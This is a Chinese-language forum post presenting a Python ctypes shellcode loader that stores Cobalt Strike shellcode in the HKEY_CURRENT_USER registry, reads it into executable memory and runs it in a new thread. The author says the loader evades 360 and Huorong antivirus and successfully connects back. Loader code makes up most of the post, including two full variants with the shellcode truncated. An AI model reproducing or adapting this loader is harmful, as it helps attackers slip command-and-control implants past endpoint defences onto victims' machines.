前言
==

最近毕业了，开始了新的打工生活，知识也被榨干了，更新比较慢

前几天不是发了几个UUID、MAC、ipv4等加载器吗，这几个原理都一个样，就是转换内容然后写到内存中去，说白了只要能往内存写东西的函数都能写成加载器

这几天研究api操作注册表想绕过360等，突然想起注册表是可以存储二进制内容的，然后就发现了RegQueryValueExA函数是可以读取 注册表中内容的，所以我们只要将读取的内容存到申请的内存中去执行即可。

本文环境使用py2.7，通过ctypes库调用RegQueryValueExA函数实现上线cs

注册表
===

注册表就不多介绍了，乱七八糟的我也讲不懂，自己百度  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6eb1edfcdbd2e1678839df2b06471296353dbffb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6eb1edfcdbd2e1678839df2b06471296353dbffb.png)  
但主要一点，我们操作注册表是需要权限的，但HKLM\_CURRWNT\_USER表是不需要权限的，所以我们主要操作这个表

函数介绍
====

在读取注册表内容之前，注册表得有我们的shellcode内容啊，命令行操作reg又不行，拦的死死地，所以只能用api进行写入我们的shellcode

### RegSetValueExA

该函数在Advapi32.dll库中，可以设置注册表项下指定值的数据和类型。

函数原型：

<https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa>

```php
LSTATUS RegSetValueExA(
  HKEY       hKey,
  LPCSTR     lpValueName,
  DWORD      Reserved,
  DWORD      dwType,
  const BYTE *lpData,
  DWORD      cbData
);
```

hKey为上面五个表其中一种，这里操作HKLM\_CURRWNT\_USER，在py里对应值是-2147483647

lpValueName是在表里新建一个值

dwType是值的类型，在注册表里不同的值类型储存不同格式的数据，我们需要储存二进制数据，所以值类型为REG\_BINARY，py里对应数值为3

lpData这是我们需要写入的数据，这里写入shellcode

cbData是数据的大小，必须将shellcode全部写入

```php
buf = b"\xfc\x00..."
ctypes.windll.Advapi32.RegSetValueExA(-2147483647, "test", None, 3, buf,len(buf))
```

此时看看注册表里的内容是不是shellcode  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-647be9cd32252c547cc07930d87858fcda27c77b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-647be9cd32252c547cc07930d87858fcda27c77b.png)

### RegQueryValueExA

该函数在Advapi32.dll库中，检索与打开的注册表项关联的指定值名称的类型和数据。

函数原型：

<https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa>

```php
LSTATUS RegQueryValueExA(
  HKEY    hKey,
  LPCSTR  lpValueName,
  LPDWORD lpReserved,
  LPDWORD lpType,
  LPBYTE  lpData,
  LPDWORD lpcbData
);
```

hKey对应上面注册表的组  
lpValueName对应上面值的名称

lpType接收查到的值的类型，可以为0表示不需要此内容

lpData则接收我们查到的值的数据，也就是我们的shellcode，这里需要VirtualAlloc申请一块内存来接收此数据，这里根据需要的指针类型将内存改为LPBYTE的指针

```php
LPBYTE = POINTER(c_byte)
ctypes.windll.kernel32.VirtualAlloc.restype = LPBYTE
ptr = ctypes.windll.kernel32.VirtualAlloc(0,800,0x3000,0x40)
```

lpcbData则是shellcode的长度，这里长度我们需要先执行一下RegQueryValueExA来获取一下shellcode长度，然后继续直接RegQueryValueExA来去读内容到申请的内存

```php
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "test", 0, 0, 0, byref(data_len))
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647,"test",0,None,ptr,byref(data_len))
```

这时shellcode已经写入到内存中去了，继续老一套创建线程运行即可

当写完内存，以防万一将写入的注册表进行删除

```php
ctypes.windll.Advapi32.RegDelete ValueA(-2147483647, "test")
```

测试
==

环境py2.7 ,使用cs生成64位shellcode

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-10d4d301e86d9f1778a3ab2c75ea396ed55ec897.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-10d4d301e86d9f1778a3ab2c75ea396ed55ec897.png)  
这里测试了火绒，360，成功上线

```php
import ctypes
from ctypes import *
from ctypes.wintypes import *

buf = b"\xfc\x48..."
ctypes.windll.Advapi32.RegSetValueExA(-2147483647, "test", None, 3, buf,len(buf))

LPBYTE = POINTER(c_byte)
ctypes.windll.Activeds.AllocADsMem.restype = LPBYTE
ptr = ctypes.windll.Activeds.AllocADsMem(len(buf))
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "test", 0, 0, 0, byref(data_len))
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647,"test",0,None,ptr,byref(data_len))
ctypes.windll.Advapi32.RegDelete ValueA(-2147483647, "test")
ctypes.windll.kernel32.VirtualProtect(ptr, len(buf), 0x40, ctypes.byref(ctypes.c_long(1)))

handle = ctypes.windll.kernel32.CreateThread(0,0,ptr,0,0,ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleO bject(handle,-1)
```

```php
import ctypes
from ctypes import *
from ctypes.wintypes import *

buf = b"\xfc\x48\x83..."
ctypes.windll.Advapi32.RegSetValueExA(-2147483647, "test", None, 3, buf,len(buf))

LPBYTE = POINTER(c_byte)
ctypes.windll.Activeds.ReallocADsMem.restype = LPBYTE
ptr = ctypes.windll.Activeds.ReallocADsMem(0,len(buf),len(buf))
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "test", 0, 0, 0, byref(data_len))
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647,"test",0,None,ptr,byref(data_len))
ctypes.windll.Advapi32.RegDelete ValueA(-2147483647, "test")
ctypes.windll.kernel32.VirtualProtect(ptr, len(buf), 0x40, ctypes.byref(ctypes.c_long(1)))

handle = ctypes.windll.kernel32.CreateThread(0,0,ptr,0,0,ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleO bject(handle,-1)
```